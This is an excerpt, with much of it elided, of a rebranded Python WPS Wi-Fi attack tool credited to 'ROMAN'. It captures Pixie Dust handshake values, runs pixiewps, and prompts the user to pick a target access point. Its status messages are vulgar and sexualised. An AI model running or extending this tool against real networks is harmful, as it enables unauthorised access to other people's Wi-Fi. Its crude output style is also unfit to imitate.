    ...
    def __handle_wpas(self, pixiemode=False, verbose=None):
        ...
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                ...
                if pixiemode:
                    print('[‼️] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[‼️] PKR: {}'.format(self.pixie_creds.pkr))
            ...
            if '-> SCANNING' in line:
                ...
                print('[\033[1;33m*\033[1;37m] fucking…')
...
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
            ...
            print('[\033[1;33m*\033[1;37m] Deep fucking🫦…')
        elif 'Authentication response' in line:
            print('[\033[1;32m+\033[1;37m] Fucked😍')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[\033[1;33m*\033[1;37m] Fucking with AP😡…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print('[\033[1;32m+\033[1;37m] Fucked with 🥵 {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                print('[\033[1;32m+\033[1;37m] Fucked with 🥵 {}'.format(bssid))
    ...
    def __runPixiewps(self, showcmd=False, full_range=False):
        print("[\033[1;33m*\033[1;37m] Fucking with Pixiewps…")
    ...
    def iw_scanner(self) -> Dict[int, dict]:
        ...
        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored(' READY TO FUCK ', color='green'),
...
WPS WIFI HACKING TOOL
 ...
 |_|   |_____/_/ \_\_____|
                          ...
                          \n\t\t\033[1;36mFUCKED BY ROMAN 
                                                    \n\t\t[\033[1;32m*\033[1;37m] NAME        : ROMAN\n\t\t[\033[1;32m*\033[1;37m] WORK ONLY   : GREEN-COLOR WIFI\n\t\t[\033[1;32m*\033[1;37m] AUTHOR      : ROMAN\n\t\t[\033[1;32m*\033[1;37m] Version     : ROMAN2.0 \n\t\t[\033[1;32m*\033[1;37m] FACEBOOK    :facebook.com/roman.fb036\n''')
        ...
        while 1:
            try:
                print('\n\033[1;32m════════════════════════════════════════════════════════\033[1;37m')
                networkNo = input('[\033[1;33m?\033[1;37m] Select target for fuck (press Enter to refresh): ')
...
def usage():
    return """
ROMAN 0.0.2 (c) 2017 rofl0r (modified).
        ...
        try:
            ...
            if args.loop:
                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    ani("\n[\033[1;31m!\033[1;37m] thanks for use 🤗Create by ROMAN 🔥 …")
                    break
                else:
                    args.bssid = None
            else:
